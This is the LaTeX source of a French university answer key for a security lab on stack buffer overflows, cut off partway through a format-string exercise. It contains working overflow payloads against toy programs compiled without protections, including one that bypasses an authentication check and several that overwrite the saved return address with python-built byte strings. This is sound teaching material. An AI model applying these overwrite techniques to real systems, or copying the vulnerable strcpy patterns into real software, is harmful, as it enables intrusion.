\documentclass[a4paper,11pt]{article}

\usepackage{fullpage}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{amsmath,amsthm}
\usepackage{amsfonts}
\usepackage{graphicx}
\usepackage{latexsym}
\usepackage{float}
\usepackage{comment}
\usepackage{array}
\usepackage{booktabs}

% --- Packages ajoutés pour l'enrichissement pédagogique ---
\usepackage{xcolor}
\usepackage{listings}
\usepackage[most]{tcolorbox}
\usepackage{hyperref}

%%%%%%%%%%%%%%% CONFIGURATION LISTINGS %%%%%%%%%%%%%%%%%%%

\definecolor{codegreen}{rgb}{0.25,0.49,0.25}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{codered}{rgb}{0.7,0.1,0.1}
\definecolor{codeblue}{rgb}{0.0,0.0,0.7}
\definecolor{backcolour}{rgb}{0.97,0.97,0.97}

\lstset{
    language=C,
    backgroundcolor=\color{backcolour},
    commentstyle=\color{codegreen}\itshape,
    keywordstyle=\color{codeblue}\bfseries,
    stringstyle=\color{codered},
    basicstyle=\ttfamily\small,
    breakatwhitespace=false,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    numbers=left,
    numbersep=8pt,
    numberstyle=\tiny\color{codegray},
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=4,
    frame=single,
    rulecolor=\color{codegray},
    xleftmargin=1.5em,
    framexleftmargin=1.5em,
    literate={é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ù}{{\`u}}1 {î}{{\^i}}1 {ô}{{\^o}}1
}

%%%%%%%%%%%%%%% ENVIRONNEMENTS TCOLORBOX %%%%%%%%%%%%%%%%%%

% Rappel de cours (fond bleu clair)
\newtcolorbox{rappel}[1][]{
    colback=blue!5!white,
    colframe=blue!50!black,
    fonttitle=\bfseries,
    title={\large Rappel de cours},
    #1
}

% Point clé (fond vert clair)
\newtcolorbox{pointcle}[1][]{
    colback=green!5!white,
    colframe=green!40!black,
    fonttitle=\bfseries,
    title={Point clé à retenir},
    #1
}

% Attention (fond orange clair)
\newtcolorbox{attention}[1][]{
    colback=orange!8!white,
    colframe=orange!60!black,
    fonttitle=\bfseries,
    title={Attention},
    #1
}

% Avertissement éthique (fond rouge)
\newtcolorbox{ethique}[1][]{
    colback=red!5!white,
    colframe=red!60!black,
    fonttitle=\bfseries\large,
    title={Avertissement éthique et légal},
    #1
}

%%%%%%%%%%%%%%% COMMANDES %%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\itemb}{\item[$\bullet$]}

\newcommand{\Fd}{\mathbb{F}}
\newcommand{\Znat}{\mathbb{Z}}
\newcommand{\Nnat}{\mathbb{N}}

%%%%%%%%%%%%%%% ENVIRONEMENTS %%%%%%%%%%%%%%%%%%%%%%%

\theoremstyle{plain}
\newtheorem{lemme}{Lemme}
\newtheorem{algorithme}{Algorithme}
\newtheorem{corolaire}{Corollaire}
\newtheorem{propriete}{Propri\'et\'e}
\newtheorem{proposition}{Proposition}
\newtheorem{theoreme}{Th\'eor\`eme}
\newtheorem{definition}{D\'efinition}
\newtheorem{correction}{Correction}

\theoremstyle{definition}
\newtheorem{exercice}{Exercice}
\newtheorem{remarque}{Remarque}
\newtheorem{exemple}{Exemple}

\hypersetup{
    colorlinks=true,
    linkcolor=blue!60!black,
    urlcolor=blue!60!black
}

%%%%%%%%%%%%%% DOCUMENTS %%%%%%%%%%%%%%%%%%%%%%%%%%%%


\begin{document}

\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
\noindent \textbf{Université de Perpignan} \hfill  L3 Informatique \\
 \hfill C. Legrand \hfill  Année \the\year \\
\smallskip
\begin{center}
{
  {\scshape \large Corrigé -- TD5 Sécurité}  \\
 Techniques d'intrusion -- Débordement de tampon
}
\end{center}
\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.9pt width \textwidth}}

\bigskip

% --- Avertissement éthique ---
\begin{ethique}
Les techniques présentées dans ce TD sont étudiées dans un \textbf{cadre strictement académique} afin de comprendre les mécanismes utilisés par les attaquants et ainsi pouvoir mieux s'en protéger.

\textbf{Toute utilisation de ces techniques en dehors du cadre pédagogique est illégale} et passible de sanctions pénales (chapitre III du Code pénal, articles 323-1 à 323-8 -- \textit{Des atteintes aux systèmes de traitement automatisé de données}) :
\begin{itemize}
    \item Accès ou maintien frauduleux dans un STAD (art.~323-1) : \textbf{3 ans} d'emprisonnement et \textbf{100\,000\,\texteuro{}} d'amende
    \item Entrave au fonctionnement d'un STAD (art.~323-2) : \textbf{5 ans} d'emprisonnement et \textbf{150\,000\,\texteuro{}} d'amende
    \item Introduction frauduleuse de données dans un STAD (art.~323-3) : \textbf{5 ans} d'emprisonnement et \textbf{150\,000\,\texteuro{}} d'amende
\end{itemize}
Peines portées à \textbf{7 ans} et \textbf{300\,000\,\texteuro{}} lorsque le système visé traite des données à caractère personnel mis en \oe uvre par l'État, et jusqu'à \textbf{10 ans} et \textbf{300\,000\,\texteuro{}} en bande organisée (art.~323-4-1). \textit{Peines mises à jour par la loi LOPMI n\textsuperscript{o}2023-22 du 24 janvier 2023.}
\end{ethique}

\bigskip

\begin{tcolorbox}[colback=gray!5!white, colframe=gray!60!black, title={Options de compilation}]
Les options suivantes sont à utiliser lorsque l'on veut déborder sur la pile (\texttt{-fno-stack-protector}) et connaître les adresses du code (\texttt{-no-pie}) qui ne sont plus randomisées :
\begin{lstlisting}[language=bash,numbers=none]
gcc -fno-stack-protector -no-pie -g code.c
\end{lstlisting}
Une dernière option que l'on n'utilisera pas : si l'on souhaite exécuter du code injecté dans la pile (\texttt{-z execstack}).
\end{tcolorbox}

\medskip

\begin{rappel}
\textbf{Organisation de la pile (stack) :} lors de l'appel d'une fonction, le processeur empile :
\begin{enumerate}
    \item Les paramètres de la fonction (en partie via registres en x86-64)
    \item L'adresse de retour \texttt{savedRIP} (empilée par \texttt{call})
    \item L'ancien \texttt{RBP} (\texttt{savedRBP}) sauvegardé par \texttt{push rbp}
    \item Les variables locales de la fonction
\end{enumerate}
Le registre \texttt{RSP} pointe sur le sommet de la pile ; \texttt{RBP} pointe sur la base du cadre de pile courant.
\end{rappel}

\bigskip


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% EXERCICE 1 : Débordement de tampon simple
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\begin{exercice}[Débordement de tampon]
\begin{enumerate}
\item
On considère le programme suivant :
\begin{lstlisting}[language=C]
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]){
  int valeur=5;
  char tampon_un[8], tampon_deux[8];

  strcpy(tampon_un,"un");
  strcpy(tampon_deux,"deux");

  printf("[AVANT] tampon_deux est a %p et contient '%s'\n",
         tampon_deux, tampon_deux);
  printf("[AVANT] tampon_un est a %p et contient '%s'\n",
         tampon_un, tampon_un);
  printf("[AVANT] valeur est a %p et vaut %d (0x%08x)\n",
         &valeur, valeur, valeur);

  printf("\n [STRCPY] copie de %d octets dans tampon_deux\n\n",
         (int)strlen(argv[1]));
  strcpy(tampon_deux, argv[1]);

  printf("[APRES] tampon_deux est a %p et contient '%s'\n",
         tampon_deux, tampon_deux);
  printf("[APRES] tampon_un est a %p et contient '%s'\n",
         tampon_un, tampon_un);
  printf("[APRES] valeur est a %p et vaut %d (0x%08x)\n",
         &valeur, valeur, valeur);

  return(0);
}
\end{lstlisting}

En faisant varier l'argument, provoquer un débordement de tampon, analysez-le avec \texttt{gdb}.

\begin{correction}
\textbf{Compilation et tests :}

On compile sans les protections de pile :
\begin{lstlisting}[language=bash,numbers=none]
$ gcc -fno-stack-protector -no-pie -g exo1q1.c -o exo1q1
\end{lstlisting}

\textbf{Test normal (pas de débordement) :}
\begin{lstlisting}[language=bash,numbers=none]
$ ./exo1q1 AAAA
[AVANT] tampon_deux est a 0x7fffffffde00 et contient 'deux'
[AVANT] tampon_un est a 0x7fffffffde08 et contient 'un'
[AVANT] valeur est a 0x7fffffffde14 et vaut 5 (0x00000005)

 [STRCPY] copie de 4 octets dans tampon_deux

[APRES] tampon_deux est a 0x7fffffffde00 et contient 'AAAA'
[APRES] tampon_un est a 0x7fffffffde08 et contient 'un'
[APRES] valeur est a 0x7fffffffde14 et vaut 5 (0x00000005)
\end{lstlisting}

On observe que \texttt{tampon\_deux} est à l'adresse \texttt{0x7fffffffde00} et \texttt{tampon\_un} est à \texttt{0x7fffffffde08}, soit 8 octets plus haut. La variable \texttt{valeur} est à \texttt{0x7fffffffde14}, soit 12 octets après \texttt{tampon\_un}.

\textbf{Débordement dans tampon\_un (9 à 16 caractères) :}
\begin{lstlisting}[language=bash,numbers=none]
$ ./exo1q1 AAAAAAAABBBBBBBB
[AVANT] tampon_deux est a 0x7fffffffde00 et contient 'deux'
[AVANT] tampon_un est a 0x7fffffffde08 et contient 'un'
[AVANT] valeur est a 0x7fffffffde14 et vaut 5 (0x00000005)

 [STRCPY] copie de 16 octets dans tampon_deux

[APRES] tampon_deux est a 0x7fffffffde00 et contient 'AAAAAAAABBBBBBBB'
[APRES] tampon_un est a 0x7fffffffde08 et contient 'BBBBBBBB'
[APRES] valeur est a 0x7fffffffde14 et vaut 5 (0x00000005)
\end{lstlisting}

Les 8 premiers octets (\texttt{AAAAAAAA}) remplissent \texttt{tampon\_deux}. Les 8 suivants (\texttt{BBBBBBBB}) débordent dans \texttt{tampon\_un} et l'écrasent.

\textbf{Débordement jusqu'à valeur (plus de 20 caractères) :}
\begin{lstlisting}[language=bash,numbers=none]
$ ./exo1q1 AAAAAAAABBBBBBBBCCCCCCCC
[AVANT] tampon_deux est a 0x7fffffffde00 et contient 'deux'
[AVANT] tampon_un est a 0x7fffffffde08 et contient 'un'
[AVANT] valeur est a 0x7fffffffde14 et vaut 5 (0x00000005)

 [STRCPY] copie de 24 octets dans tampon_deux

[APRES] tampon_deux est a 0x7fffffffde00 et contient 'AAAAAAAABBBBBBBBCCCCCCCC'
[APRES] tampon_un est a 0x7fffffffde08 et contient 'BBBBBBBBCCCCCCCC'
[APRES] valeur est a 0x7fffffffde14 et vaut 1128481603 (0x43434343)
\end{lstlisting}

La variable \texttt{valeur} a été écrasée par \texttt{0x43434343} (code ASCII de \texttt{'C'} = \texttt{0x43}). Le débordement de \texttt{tampon\_deux} a traversé \texttt{tampon\_un} puis atteint \texttt{valeur}.

\textbf{Analyse avec gdb :}
\begin{lstlisting}[language=bash,numbers=none]
$ gdb ./exo1q1
(gdb) break main
(gdb) run AAAAAAAABBBBBBBBCCCCCCCC
(gdb) next
... (avancer jusqu'après le strcpy)
(gdb) x/8xw $rbp-0x20
0x7fffffffde00: 0x41414141  0x41414141  0x42424242  0x42424242
0x7fffffffde10: 0x43434343  0x43434343  0x00000000  0x00000000
\end{lstlisting}

On voit clairement la disposition mémoire : les \texttt{A} dans \texttt{tampon\_deux}, les \texttt{B} dans \texttt{tampon\_un}, et les \texttt{C} qui débordent sur \texttt{valeur} et au-delà.

\begin{pointcle}
La pile croît vers les adresses basses, mais les tableaux sont remplis vers les adresses hautes. Ainsi, un débordement de \texttt{tampon\_deux} écrase d'abord \texttt{tampon\_un} (adresse supérieure), puis \texttt{valeur}, puis \texttt{savedRBP} et \texttt{savedRIP}.
\end{pointcle}
\end{correction}


\item  On considère maintenant le bout de programme ci-dessous qui restreint les droits d'accès :

\begin{lstlisting}[language=C]
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int verif_authentication(char *password){
  int auth_flag = 0;
  char password_tampon[16];

  strcpy(password_tampon, password);

  if( strcmp(password_tampon, "brillig") == 0)
    auth_flag = 1;
  if(strcmp(password_tampon, "outgrabe") == 0)
    auth_flag = 1;

  return auth_flag;
}

int main( int argc, char *argv[]){
  if(argc < 2){
    printf("Usage: %s <password>\n", argv[0]);
    exit(0);
  }

  if(verif_authentication(argv[1])){
    printf("\n-=-=-=-=-=-=-=-=-=-=--=-=-\n");
    printf("      Acces accorde.\n");
    printf("-=-=-=-=-=-=-=-=-=-=--=-=-\n");
  }
  else
    printf("     Acces refuse\n");
}
\end{lstlisting}
Est-il possible de faire un débordement de tampon pour forcer l'accès (\texttt{auth\_flag} $\neq 0$) ? Que se passe-t-il si les variables sont déclarées dans l'ordre suivant :
\begin{lstlisting}[language=C,numbers=none]
  char password_buffer[16];
  int auth_flag = 0;
\end{lstlisting}
Peut-on contourner ce problème pour faire afficher quand même \texttt{Acces accorde} par débordement de tampon ? Expliquez en détail pourquoi ça fonctionne.

\begin{correction}
\textbf{Cas 1 : \texttt{auth\_flag} déclaré AVANT \texttt{password\_tampon} (code original)}

Dans le code original, \texttt{auth\_flag} est déclaré avant \texttt{password\_tampon}. Sur la pile, la disposition typique est (des adresses basses vers les hautes) :

\begin{center}
\begin{tabular}{|c|l|}
\hline
\textbf{Adresse} & \textbf{Contenu} \\
\hline
\texttt{rbp-0x20} & \texttt{password\_tampon[0..7]} \\
\texttt{rbp-0x18} & \texttt{password\_tampon[8..15]} \\
\texttt{rbp-0x04} & \texttt{auth\_flag} \\
\texttt{rbp+0x00} & \texttt{savedRBP} \\
\texttt{rbp+0x08} & \texttt{savedRIP} \\
\hline
\end{tabular}
\end{center}

Lorsqu'on dépasse 16 caractères dans le \texttt{strcpy}, le débordement de \texttt{password\_tampon} atteint la zone de padding puis \texttt{auth\_flag}. Les octets excédentaires (forcément non nuls car ce sont des caractères imprimables) écrasent \texttt{auth\_flag} avec une valeur non nulle.

\begin{lstlisting}[language=bash,numbers=none]
$ gcc -fno-stack-protector -no-pie -g exo1q2.c -o exo1q2
$ ./exo1q2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-=-=-=-=-=-=-=-=-=-=--=-=-
      Acces accorde.
-=-=-=-=-=-=-=-=-=-=--=-=-
\end{lstlisting}

On vérifie avec gdb :
\begin{lstlisting}[language=bash,numbers=none]
(gdb) disassemble verif_authentication
... on repère que password_tampon est a rbp-0x20
... et auth_flag est a rbp-0x4
\end{lstlisting}

Le débordement de \texttt{password\_tampon} (16 octets) parcourt d'abord les octets de padding éventuels entre la fin du tableau et \texttt{auth\_flag}. En écrivant suffisamment de caractères (par exemple 30 octets), on est certain d'écraser \texttt{auth\_flag} avec des valeurs non nulles (\texttt{0x41} = \texttt{'A'}).

\bigskip

\textbf{Cas 2 : \texttt{password\_buffer} déclaré AVANT \texttt{auth\_flag}}

Si les déclarations sont inversées :
\begin{lstlisting}[language=C,numbers=none]
  char password_buffer[16];
  int auth_flag = 0;
\end{lstlisting}

Le compilateur place typiquement \texttt{auth\_flag} à une adresse \textbf{plus basse} que \texttt{password\_buffer} sur la pile (ou à côté dans un sens que le débordement ne peut pas atteindre). La disposition devient :

\begin{center}
\begin{tabular}{|c|l|}
\hline
\textbf{Adresse} & \textbf{Contenu} \\
\hline
\texttt{rbp-0x24} & \texttt{auth\_flag} \\
\texttt{rbp-0x20} & \texttt{password\_buffer[0..7]} \\
\texttt{rbp-0x18} & \texttt{password\_buffer[8..15]} \\
\texttt{rbp+0x00} & \texttt{savedRBP} \\
\texttt{rbp+0x08} & \texttt{savedRIP} \\
\hline
\end{tabular}
\end{center}

Le débordement de \texttt{password\_buffer} va vers les adresses \textbf{croissantes}, donc il écrase \texttt{savedRBP} puis \texttt{savedRIP}, mais ne peut \textbf{pas} atteindre \texttt{auth\_flag} qui se trouve à une adresse plus basse.

\begin{lstlisting}[language=bash,numbers=none]
$ ./exo1q2v2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
     Acces refuse
Segmentation fault (core dumped)
\end{lstlisting}

On obtient \og{}Acces refuse\fg{} (car \texttt{auth\_flag} n'a pas été modifié), suivi d'un \textit{segfault} car \texttt{savedRIP} a été écrasé.

\bigskip

\textbf{Contournement : écraser savedRIP pour rediriger l'exécution}

Même si on ne peut plus modifier \texttt{auth\_flag}, on peut écraser \texttt{savedRIP} pour rediriger l'exécution directement vers le bloc de code qui affiche \og{}Acces accorde\fg{} dans \texttt{main}.

On utilise \texttt{gdb} pour trouver l'adresse cible :
\begin{lstlisting}[language=bash,numbers=none]
(gdb) disassemble main
   ...
   0x0000000000401209 <+52>:  call   0x4011b6 <verif_authentication>
   0x000000000040120e <+57>:  test   eax,eax
   0x0000000000401210 <+59>:  je     0x40123a <main+101>
   0x0000000000401212 <+61>:  lea    rdi,[rip+0xdf7]  # chaine "-=-=-..."
   0x0000000000401219 <+68>:  call   0x401040 <puts@plt>
   0x000000000040121e <+73>:  lea    rdi,[rip+0xe07]  # "Acces accorde."
   0x0000000000401225 <+80>:  call   0x401040 <puts@plt>
   ...
\end{lstlisting}

On veut sauter au \texttt{lea} qui prépare l'affichage de la première ligne de succès, par exemple à l'adresse \texttt{0x401212}. Il faut calculer le nombre d'octets de padding nécessaires pour atteindre \texttt{savedRIP} depuis \texttt{password\_buffer} :

\begin{itemize}
    \item \texttt{password\_buffer} commence à \texttt{rbp-0x20}
    \item \texttt{savedRIP} est à \texttt{rbp+0x08}
    \item Distance : \texttt{0x20 + 0x08 = 0x28 = 40} octets
    \item Dont 16 octets pour le tampon lui-même, 8 pour le padding/autres variables, 8 pour \texttt{savedRBP}, puis 8 pour \texttt{savedRIP}
\end{itemize}

On construit alors le payload :
\begin{lstlisting}[language=bash,numbers=none]
$ ./exo1q2v2 $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\x12\x12\x40\x00\x00\x00\x00\x00')")

-=-=-=-=-=-=-=-=-=-=--=-=-
      Acces accorde.
-=-=-=-=-=-=-=-=-=-=--=-=-
Segmentation fault (core dumped)
\end{lstlisting}

Le \textit{segfault} à la fin est normal : après l'affichage, la pile est corrompue et le retour de \texttt{main} échoue. Mais le message \og{}Acces accorde\fg{} a bien été affiché.

\begin{attention}
L'adresse exacte de l'instruction cible dépend de la compilation. Il faut \textbf{toujours} vérifier avec \texttt{gdb} le désassemblage de \texttt{main} pour obtenir l'adresse correcte. L'option \texttt{-no-pie} est indispensable pour que les adresses soient fixes d'une exécution à l'autre.
\end{attention}

\begin{pointcle}
Même lorsque le débordement ne peut pas atteindre directement la variable cible, l'écrasement de \texttt{savedRIP} permet de détourner le flot d'exécution. C'est le principe fondamental de l'attaque par \textit{return address overwrite}.
\end{pointcle}
\end{correction}

\end{enumerate}
\end{exercice}


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% EXERCICE 2 : Modification d'adresse de retour (incrément)
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\begin{exercice}[Modification d'adresse de retour dans la pile]
Reprenez le code vu en cours (donné ci-dessous) et ajustez les valeurs de $a$ et de $b$ afin d'exécuter en retour de fonction :
\begin{itemize}
\item Directement la fin de la fonction \texttt{main} (donc pas de \texttt{printf("coucou1")} et \texttt{printf("coucou2")}).
  \item Que se passera-t-il si on revient à l'instruction \texttt{b=15} ?
\end{itemize}

\begin{lstlisting}[language=C]
#include <stdio.h>

void function(long a, long b)
{
  long buffer[2]={0,1};
  buffer[a]+=b;
}
void main()
{
  long a,b;
  a=1;
  b=15;
  function(a,b);
  printf("coucou1\n");
  printf("coucou2\n");
}
\end{lstlisting}

\begin{correction}
\textbf{Analyse du cadre de pile de \texttt{function} :}

On compile et on analyse avec \texttt{gdb} :
\begin{lstlisting}[language=bash,numbers=none]
$ gcc -fno-stack-protector -no-pie -g exo2.c -o exo2
$ gdb ./exo2
(gdb) disassemble function
Dump of assembler code for function function:
   0x0000000000401136 <+0>:   push   rbp
   0x0000000000401137 <+1>:   mov    rbp,rsp
   0x000000000040113a <+4>:   sub    rsp,0x20
   0x000000000040113e <+8>:   mov    QWORD PTR [rbp-0x24],rdi  ; a
   0x0000000000401142 <+12>:  mov    QWORD PTR [rbp-0x28],rsi  ; b (ou via registre)
   0x0000000000401146 <+16>:  mov    QWORD PTR [rbp-0x10],0x0  ; buffer[0]=0
   0x000000000040114e <+24>:  mov    QWORD PTR [rbp-0x8],0x1   ; buffer[1]=1
   ...
\end{lstlisting}

La disposition de la pile dans \texttt{function} est :

\begin{center}
\begin{tabular}{|c|l|l|}
\hline
\textbf{Position} & \textbf{Contenu} & \textbf{Indice buffer} \\
\hline
\texttt{rbp-0x10} & \texttt{buffer[0]} & indice 0 \\
\texttt{rbp-0x08} & \texttt{buffer[1]} & indice 1 \\
\texttt{rbp+0x00} & \texttt{savedRBP} & indice 2 \\
\texttt{rbp+0x08} & \texttt{savedRIP} & indice 3 \\
\hline
\end{tabular}
\end{center}

Chaque \texttt{long} fait 8 octets. La distance entre \texttt{buffer[0]} (\texttt{rbp-0x10}) et \texttt{savedRIP} (\texttt{rbp+0x08}) est de \texttt{0x18 = 24} octets, soit 3 \texttt{long}. Donc pour accéder à \texttt{savedRIP} via \texttt{buffer}, il faut l'indice \textbf{a = 3}.

\textbf{Analyse du code de \texttt{main} :}
\begin{lstlisting}[language=bash,numbers=none]
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000401162 <+0>:   push   rbp
   0x0000000000401163 <+1>:   mov    rbp,rsp
   0x0000000000401166 <+4>:   sub    rsp,0x10
   0x000000000040116a <+8>:   mov    QWORD PTR [rbp-0x10],0x1  ; a=1
   0x0000000000401172 <+16>:  mov    QWORD PTR [rbp-0x8],0xf   ; b=15
   0x000000000040117a <+24>:  mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040117e <+28>:  mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000401182 <+32>:  mov    rsi,rdx
   0x0000000000401185 <+35>:  mov    rdi,rax
   0x0000000000401188 <+38>:  call   0x401136 <function>
   0x000000000040118d <+43>:  lea    rdi,[rip+0xe70]            ; "coucou1"
   0x0000000000401194 <+50>:  call   0x401030 <puts@plt>
   0x0000000000401199 <+55>:  lea    rdi,[rip+0xe68]            ; "coucou2"
   0x00000000004011a0 <+62>:  call   0x401030 <puts@plt>
   0x00000000004011a5 <+67>:  nop
   0x00000000004011a6 <+68>:  leave
   0x00000000004011a7 <+69>:  ret
\end{lstlisting}

L'instruction \texttt{call function} est à l'adresse \texttt{0x401188}. Donc \texttt{savedRIP} contient \texttt{0x40118d} (l'adresse de l'instruction suivante, \texttt{printf("coucou1")}).

\textbf{Pour sauter directement à la fin de main (pas de coucou1 ni coucou2) :}

On veut que \texttt{savedRIP} pointe vers le \texttt{nop} ou le \texttt{leave} à la fin de \texttt{main}, c'est-à-dire l'adresse \texttt{0x4011a5}.

L'incrément nécessaire est :
\[
b = \texttt{0x4011a5} - \texttt{0x40118d} = \texttt{0x18} = 24
\]

Donc : \textbf{a = 3, b = 24}.

\begin{lstlisting}[language=C]
#include <stdio.h>

void function(long a, long b)
{
  long buffer[2]={0,1};
  buffer[a]+=b;
}
void main()
{
  long a,b;
  a=3;
  b=24;
  function(a,b);
  printf("coucou1\n");
  printf("coucou2\n");
}
\end{lstlisting}

\begin{lstlisting}[language=bash,numbers=none]
$ ./exo2
$
\end{lstlisting}

Aucun \texttt{printf} n'est exécuté : le programme saute directement à la fin de \texttt{main}.

\begin{pointcle}
L'instruction \texttt{buffer[a] += b} avec \texttt{a=3} modifie directement \texttt{savedRIP} car \texttt{buffer[3]} correspond exactement à l'emplacement de l'adresse de retour. L'incrément \texttt{b} fait avancer cette adresse pour sauter par-dessus les instructions \texttt{printf}.
\end{pointcle}

\bigskip

\textbf{Que se passe-t-il si on revient à l'instruction \texttt{b=15} ?}

L'instruction \texttt{b=15} (i.e. \texttt{mov QWORD PTR [rbp-0x8],0xf}) est à l'adresse \texttt{0x401172}. Depuis \texttt{savedRIP = 0x40118d} :
\[
b = \texttt{0x401172} - \texttt{0x40118d} = -\texttt{0x1b} = -27
\]

Donc avec \textbf{a = 3, b = -27}, le retour de \texttt{function} atterrit sur l'instruction \texttt{b=15} dans \texttt{main}.

Cela crée une \textbf{boucle infinie} : le programme exécute \texttt{b=15}, puis \texttt{function(a,b)}, qui à chaque fois modifie \texttt{savedRIP} pour revenir à \texttt{b=15}, et ainsi de suite. Les \texttt{printf("coucou1")} et \texttt{printf("coucou2")} ne sont jamais atteints. La pile grossit à chaque appel récursif implicite, jusqu'à un \textit{stack overflow} et un crash (\textit{segmentation fault}).

\begin{attention}
La valeur exacte de \texttt{b} dépend de l'adresse des instructions dans le binaire compilé. Il est indispensable de vérifier avec \texttt{gdb disassemble main} pour obtenir les offsets corrects.
\end{attention}
\end{correction}

\end{exercice}


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% EXERCICE 3 : Écrasement d'adresse de retour (débordement)
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\begin{exercice}[Écrasement d'adresse de retour par débordement]
On considère le code suivant :
\begin{lstlisting}[language=C]
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void f(char *s)
{
  char nom[10];
  strcpy(nom,s);
  printf("\n");
  printf("%lx\n",*((unsigned long *)(nom+18)));
  printf("Bonjour %s, on est dans f\n",nom);
}

void secret()
{
  printf("on est dans secret\n");
}

int main(int argc, char **argv)
{
  printf("adresse de f=%p, et de secret=%p\n",f,secret);
  f(argv[1]);
}
\end{lstlisting}
En écrasant l'adresse de retour de l'appel à la fonction \texttt{f}, faire en sorte d'exécuter la fonction \texttt{secret}.

\begin{correction}
\textbf{Analyse de la pile de \texttt{f} :}

On compile et on analyse :
\begin{lstlisting}[language=bash,numbers=none]
$ gcc -fno-stack-protector -no-pie -g exo3.c -o exo3
$ gdb ./exo3
(gdb) disassemble f
Dump of assembler code for function f:
   0x0000000000401196 <+0>:   push   rbp
   0x0000000000401197 <+1>:   mov    rbp,rsp
   0x000000000040119a <+4>:   sub    rsp,0x20
   0x000000000040119e <+8>:   mov    QWORD PTR [rbp-0x18],rdi
   0x00000000004011a2 <+12>:  lea    rdx,[rbp-0xa]       ; nom est a rbp-0xa
   ...
(gdb) disassemble secret
Dump of assembler code for function secret:
   0x00000000004011fd <+0>:   push   rbp
   ...
\end{lstlisting}

On identifie :
\begin{itemize}
    \item \texttt{nom} commence à \texttt{rbp-0xa} (soit \texttt{rbp-10})
    \item \texttt{savedRBP} est à \texttt{rbp+0x00} (8 octets)
    \item \texttt{savedRIP} est à \texttt{rbp+0x08}
    \item Distance de \texttt{nom} à \texttt{savedRIP} : $10 + 8 = 18$ octets
    \item L'adresse de \texttt{secret} est \texttt{0x4011fd}
\end{itemize}

C'est pour cela que le programme affiche \texttt{*((unsigned long *)(nom+18))} : cela correspond exactement à \texttt{savedRIP} !

\textbf{Construction du payload :}

Il faut écrire :
\begin{enumerate}
    \item 18 octets de remplissage (pour couvrir \texttt{nom} + \texttt{savedRBP})
    \item Puis l'adresse de \texttt{secret} en little-endian : \texttt{\textbackslash xfd\textbackslash x11\textbackslash x40\textbackslash x00\textbackslash x00\textbackslash x00\textbackslash x00\textbackslash x00}
\end{enumerate}

\begin{lstlisting}[language=bash,numbers=none]
$ ./exo3 $(python3 -c "import sys; sys.stdout.buffer.write(b'a'*18 + b'\xfd\x11\x40\x00\x00\x00\x00\x00')")
adresse de f=0x401196, et de secret=0x4011fd

4011fd
Bonjour aaaaaaaaaaaaaaaaaa??, on est dans f
on est dans secret
Segmentation fault (core dumped)
\end{lstlisting}

\textbf{Explication du résultat :}
\begin{itemize}
    \item La première ligne affiche les adresses de \texttt{f} et \texttt{secret} (grâce à \texttt{-no-pie}, elles sont fixes).
    \item La ligne \texttt{4011fd} confirme que \texttt{savedRIP} a bien été écrasé avec l'adresse de \texttt{secret}.
    \item Le message \texttt{Bonjour aaa...} affiche le contenu de \texttt{nom} qui déborde (les caractères \texttt{??} correspondent aux octets non imprimables de l'adresse).
    \item \texttt{on est dans secret} : la fonction \texttt{secret()} est bien exécutée au retour de \texttt{f} !
    \item Le \textit{segfault} final est attendu : quand \texttt{secret()} termine, elle essaie de retourner à une adresse invalide car la pile est corrompue.
\end{itemize}

\begin{pointcle}
Le principe de cette attaque est simple : on calcule la distance entre le début du tampon vulnérable et l'adresse de retour (\texttt{savedRIP}), on remplit cette zone avec du padding, puis on écrit l'adresse de la fonction cible en \textbf{little-endian}. L'option \texttt{-no-pie} est indispensable pour connaître les adresses à l'avance.
\end{pointcle}

\begin{attention}
Sur une architecture x86-64, les adresses sont codées sur 8 octets en \textbf{little-endian}. L'adresse \texttt{0x00000000004011fd} s'écrit donc \texttt{\textbackslash xfd\textbackslash x11\textbackslash x40\textbackslash x00\textbackslash x00\textbackslash x00\textbackslash x00\textbackslash x00} en mémoire.

Attention aussi : \texttt{python3 -c "print(...)"} ajoute un retour à la ligne et peut mal gérer les octets nuls. Il est plus sûr d'utiliser \texttt{sys.stdout.buffer.write()} pour écrire des octets bruts.
\end{attention}
\end{correction}

\end{exercice}


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% EXERCICE 4 : Chaîne de format printf
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\begin{exercice}[Exploitation de la chaîne de format \texttt{printf}]
On considère le code suivant compilé avec les options \texttt{-fno-stack-protector -no-pie} :
\begin{lstlisting}[language=C]
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
  unsigned long d;
  char texte[512];

  static int test_var = 100*256*256+100*256+100;
  if(argc < 3) {
